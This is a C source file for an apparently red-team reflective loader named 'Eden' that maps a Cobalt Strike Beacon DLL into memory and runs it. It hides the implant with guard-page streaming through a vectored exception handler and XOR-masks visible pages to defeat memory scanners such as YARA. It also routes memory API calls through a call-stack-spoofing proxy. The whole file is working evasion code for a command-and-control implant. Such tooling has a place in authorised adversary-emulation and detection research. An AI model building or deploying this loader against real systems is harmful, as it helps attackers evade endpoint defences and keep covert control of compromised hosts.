/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include "tcglib/loaderdefs.h"
#include "tcglib/loader.h"
#include "tcglib/picodebug.h"
#include "guardexec.h"
#include "eden.h"
#include "hooks.h"

extern ULONG_PTR Callgate(PVOID targetFunction, int numOfArgs, ...);

/* Globals */
GUARDREGION regions[MAXREGIONS];
REGIONQUEUE state;
PROXY gProxyCall;
BOOL bGuardPagesInit;

/* Used for tracking guard exec's allocations for cleanup */
PAGE_STREAM_CLEANUP pageStreamCleanup;
PPAGE_STREAM_CLEANUP gPageStreamCleanup;

/* 
* Start of page streaming code.
*/

/* Track our guard pages */
void TrackPage(ULONG_PTR page) {
    DWORD oldProt;

    if (OLDESTPAGE() != NULL){
        //dprintf("drop  page %p\n", OLDESTPAGE());
        /* You can spoof these but it has a perf hit... */
        /* e.g. Callgate(KERNEL32$VirtualProtect, 4, OLDESTPAGE(), 0x1000, PAGE_READWRITE, &oldProt); */
        KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE, &oldProt);
        memset(OLDESTPAGE(), 0, 0x1000);
        KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE | PAGE_GUARD, &oldProt);
    }

    OLDESTPAGE() = (char *)page;
    //dprintf("ADD   %p at index %d", OLDESTPAGE(), state.index);

    state.index = (state.index + 1) % MAXVISIBLE;
}

/* Add a region to guard! */
void AddGuardRegion(char * payload, int len, char * src, DWORD permissions) {
    for (int x = 0; x < MAXREGIONS; x++) {
        if (regions[x].start == 0 && regions[x].end == 0) {
            //dprintf("Setting up shop in %d for %p (%d) perms %d (SRC: %p)\n", x, payload, len, permissions, src);

            regions[x].start       = (ULONG_PTR)payload;
            regions[x].end         = (ULONG_PTR)payload + len;
            regions[x].source      = src;
            regions[x].permissions = permissions;
            return;
        }
    }
    //dprintf("No empty guard regions!\n");
}

/* Grab our guard region */
GUARDREGION * GetGuardRegion(ULONG_PTR address) {
    for (int x = 0; x < MAXREGIONS; x++) {
        if (address >= regions[x].start && address < regions[x].end)
            return & regions[x];
    }

    return NULL;
}

/*
 * A global variable with our xorkey, we're going to set this to a random value via
 * our loader.spec to demonstrate the 'patch' command applied to COFFs. Note, we set
 * this to a value, because 'patch' can't update an unintialized value.
 */
char xorkey[16] = { 1 };

/*
 * A simple routine to obfuscate and de-obfuscate memory with our payload stream data.
 */
void applyxor(char * data, DWORD len) {
    for (DWORD x = 0; x < len; x++) {
        data[x] ^= xorkey[x % 16];
    }
}

/* 
* While we sleep/context switch, mask/unmask our visible pages, boo yara.
*/
void MaskVisiblePages(){
    if (bGuardPagesInit){
        for (int x = 0; x < MAXVISIBLE; x++){
            /* You can spoof these but it has a perf hit... */
            KERNEL32$VirtualProtect(state.pages[x], 0x1000, PAGE_READWRITE, &state.prot[x]);
            applyxor((char *)state.pages[x], 0x1000);
        }
    }
}

void UnmaskVisiblePages(){
    DWORD oldProt;
    if (bGuardPagesInit) {
        for (int x = 0; x < MAXVISIBLE; x++){
            /* You can spoof these but it has a perf hit... */
            applyxor((char *)state.pages[x], 0x1000);
            KERNEL32$VirtualProtect(state.pages[x], 0x1000, state.prot[x], &oldProt);
        }
    }
}

/*
* Frees the two memory allocations used for page streaming on thread exit.
*/
void GuardExecCleanup(){
    /* Free our vectored exception handler */
    dprintf("EDEN LOADER: Clearing VEH...\n");
    (void)KERNEL32$RemoveVectoredExceptionHandler(gPageStreamCleanup->hExceptionHandler);

    /* Best effort to clean up virtual Dll and stream src. */
    /* 
    * NB This doesn't clean up the guard exec PICO + draugr stub ¯\_(ツ)_/¯
    * You could do this with either another small free PICO or by using timers.
    * https://github.com/rasta-mouse/Crystal-Kit/blob/e7f191f5ee7efbeff971d9d077fb0b61aed4259b/loader/src/cleanup.c#L19-L88
    */
    dprintf("EDEN LOADER: Freeing guardexec allocations...\n");
    /* NB VirtualFree can release pages in diff states by giving original range reserved by VirtualAlloc. */
    (void)Callgate(KERNEL32$VirtualFree, 3, (LPVOID)gPageStreamCleanup->virtualDll, 0, MEM_RELEASE);
    (void)Callgate(KERNEL32$VirtualFree, 3, (LPVOID)gPageStreamCleanup->streamDll, 0, MEM_RELEASE);
}

/*
 * Our VEH to respond to page accesses and stream in content.
 */
LONG WINAPI VEHHandler(EXCEPTION_POINTERS * pExceptionPointers) {
    PEXCEPTION_RECORD ExceptionRecord = pExceptionPointers->ExceptionRecord;
    ULONG_PTR ExceptionAddress;
    ULONG_PTR PageAddress;
    DWORD oldprot;
    GUARDREGION * guard = NULL;

    /*
      * I break for guard pages.
     */
    if (ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;

    if (ExceptionRecord->NumberParameters < 2)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Pull the needed info our of the arguments */
    //AccessType       = ExceptionRecord->ExceptionInformation[0];
    ExceptionAddress = ExceptionRecord->ExceptionInformation[1];
    PageAddress      = ExceptionAddress - (ExceptionAddress % 0x1000);

    /* Check if the exception occurred somewhere within our regions we're tracking */
    guard = GetGuardRegion(ExceptionAddress);
    if (guard == NULL) {
        //dprintf("The exception occurred elsewhere: %p\n", ExceptionAddress);
        return EXCEPTION_CONTINUE_SEARCH;
    }

    //dprintf("[%p] We have a guard page violation exception!! %p FROM %p", KERNEL32$GetCurrentThreadId(), ExceptionAddress, ExceptionRecord->ExceptionAddress);

    if (guard->permissions == PAGE_EXECUTE_READ) {
        //dprintf("LOAD  EXEC %p\n", PageAddress);
    }
    else {
        //dprintf("LOAD  DATA %p\n", PageAddress);
    }

    /* Make our target page writeable... */
    /*
    * NB you can proxy this call through callgate but there is a perf hit.
    * i.e. Callgate(KERNEL32$VirtualProtect, 4, (void *)PageAddress, 0x1000, PAGE_READWRITE, &oldprot);
    */
    ULONG_PTR srcaddr = (ULONG_PTR)guard->source + (PageAddress - guard->start);
    KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, PAGE_READWRITE, &oldprot);

    /* Stream in ONE page of content from our payload */
    memcpy(PageAddress, srcaddr, 0x1000);

    /* Unmask the page's contents */
    applyxor((char *)PageAddress, 0x1000);

    /* Change the protection of our streamed in page to the permissions we want */
    KERNEL32$VirtualProtect((void *)PageAddress, 0x1000, guard->permissions, &oldprot);

    /* This seems like a REALLY good idea here */
    KERNEL32$FlushInstructionCache((HANDLE)-1, (void *)PageAddress, 0x1000);

    /* Do the book keeping for this page */
    TrackPage(PageAddress);

    /* Yeap, the exception is expected and handled... return to our code that was executing as if nothing happened */
    return EXCEPTION_CONTINUE_EXECUTION;
}

#define FLAG(x, y) ( ((x) & (y)) == (y) )
/* Setup guard pages over Beacon */
void GuardSections(DLLDATA * dll, char * dst, char * src) {
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    DWORD                   perms            = 0;
    DWORD                   oldprot;

    /* our first section! */
    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int x = 0; x < numberOfSections; x++) {
        perms = 0;

        /*
         * It's a bad idea to take our writeable memory and subject it to streaming. This will lead to some serious
         * confusion as variable updates, suddenly, become corrupted or aren't taking. Why? Because our stream src
         * is treated as a read-only/constant thing. This implementation doesn't patch updated content in a page
         * back into the stream src for retrieval later. It could, but I didn't feel like going there for now.
         */
        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE)) {
            memcpy(dst + sectionHdr->VirtualAddress, src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);
            sectionHdr++;
            continue;
        }

        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))
            perms = PAGE_EXECUTE_READ;
        else
            perms = PAGE_READWRITE;

        /* since we're guarding this region, let's "obfuscate" the contents in our stream src */
        applyxor(src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);

        /* register this region of memory (and its permissions) in our guard table */
        AddGuardRegion(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, src + sectionHdr->VirtualAddress, perms);

        /* And, the real magic, setting up guard pages */
        Callgate(KERNEL32$VirtualProtect, 4, dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, PAGE_READWRITE | PAGE_GUARD, &oldprot);

        /* advance to our next section */
        sectionHdr++;
    }
}

/* Set our guard exec shit up */
void SetupPageGuard(DLLDATA * data, char * payload, int len) {
    char * streamSrc = NULL;

    /* initialize our regions to 0 */
    for (int x = 0; x < MAXREGIONS; x++) {
        regions[x].start = 0;
        regions[x].end   = 0;
    }

    /* initialize our state queue to 0 too */
    state.index = 0;
    for (int x = 0; x < MAXVISIBLE; x++)
        state.pages[x] = NULL;

    /* allocate our memory where our obfuscated, ready to restore, payload content will live */
    streamSrc = (char *)Callgate(KERNEL32$VirtualAlloc, 4, NULL, len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
    gPageStreamCleanup->streamDll = streamSrc;
    dprintf("EDEN LOADER: [+] Obfuscated stream region: %p\n", streamSrc);

    /* copy our payload content over to it! */
    memcpy(streamSrc, payload, len);

    /* set all of our sections to NULL, for now */
    memset(payload, 0, len);

    /* Now, we will walk the DLL, section by section, and setup guard regions and hints in our
     * global table keeping track of these things */
    GuardSections(data, payload, streamSrc);

    /* install the handler as our global VEH */
    gPageStreamCleanup->hExceptionHandler = KERNEL32$AddVectoredExceptionHandler(FALSE, (PVECTORED_EXCEPTION_HANDLER)VEHHandler);
}

/*
 * Our entrypoint
 */
void go(IMPORTFUNCS * funcs, char * src, char * loader, char * picstub) {
    char       * dst;
    DLLDATA      data;
    DLLMAIN_FUNC entry;

    /* Set up and initialize required globals. */
    bGuardPagesInit = FALSE;
    gProxyCall = (PROXY)picstub;
    gPageStreamCleanup = &pageStreamCleanup;

    /* Parse our DLL! */
    /* NB incoming src contains our memory region with unmasked DLL */
    ParseDLL(src, &data);

    /*
     * This is the memory region where our payload will live and execute from. We will use
     * page permissions to trigger VEH when the CPU tries to execute or read/write memory
     * in this block.
     */
    dst = (char*)Callgate(KERNEL32$VirtualAlloc, 4, NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
    dprintf("EDEN LOADER: Execute region: %p\n", dst);
    gPageStreamCleanup->virtualDll = dst;

    /* But first, let's load our DLL into the above memory */
    LoadDLL(&data, src, dst);

    /* Handle our import funcs */
    funcs->LoadLibraryA   = (__typeof__(LoadLibraryA) *)_LoadLibraryA;
    funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;

    /* Process the imports */
    ProcessImports((IMPORTFUNCS *)funcs, &data, dst);

    /* Now, we setup the page permissions and start clearing stuff out of our payload memory */
    SetupPageGuard(&data, dst, SizeOfDLL(&data));
    bGuardPagesInit = TRUE;

    /* Get our DLL entry point, &data is invalid after we do our free() */
    entry = EntryPoint(&data, dst);

    /* Free the memory associated with our loader */
    (void)Callgate(KERNEL32$VirtualFree, 3, loader, 0, MEM_RELEASE);

    /* Now free passed buffer for unmasked dll */
    (void)Callgate(KERNEL32$VirtualFree, 3, src, 0, MEM_RELEASE);

    /* Execute Beacon */
    entry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
    /* We pass NULL here to bypass the cleanup check (i.e. it decouples Eden from stage.cleanup) */
    entry((HINSTANCE)NULL, DLL_BEACON_START, NULL);
}

#if DEBUG_EXE
/*
* You will need to generate these headers in order to mock the entry point.
* See the `Debug Guide` in the readme for instructions on how to do this.
*/
#include "../debug/debug_beacon.h"
#include "../debug/debug_draugr.h"

/* Debug entry point */
void dbg_go(){
    /* Mock up WIN32FUNCS */
    WIN32FUNCS funcs = { 0 };
    funcs.LoadLibraryA       = LoadLibraryA;
    funcs.GetProcAddress     = GetProcAddress;
    funcs.GetModuleHandleA   = GetModuleHandleA;

    /* Load in target DLL */
    /* This is just the raw DLL so we need to work out the size first */
    SIZE_T beaconSize = sizeof(__beacon_x64_bin);
    /* If debug headers have not been updated the Beacon size will be 1*/
    if (1 == beaconSize){
        dprintf("[!] ERROR: You need to update the debug_beacon.h header! See the README for more info.\n");
        return;
    }
    char * dllStub = VirtualAlloc( NULL, beaconSize , MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    memcpy(dllStub, __beacon_x64_bin, beaconSize);

    /* Load in PIC proxy stub */
    /* Draugr PIC stub is generated by CP so has length first */
    _RESOURCE * picResource = (_RESOURCE *)__draugr_bin;
    /* If debug headers have not been updated picResource->Length will be 0x90 | 144*/
    if (144 == picResource->length){
        dprintf("[!] ERROR: You need to update the debug_draugr.h header! See the README for more info.\n");
        return;
    }
    char * proxyStub = VirtualAlloc( NULL, picResource->length , MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    memcpy(proxyStub, picResource->value, picResource->length);

    /* Invoke main entry point */
    go((IMPORTFUNCS *)&funcs, (char*)dllStub, NULL, proxyStub);
}
#endif
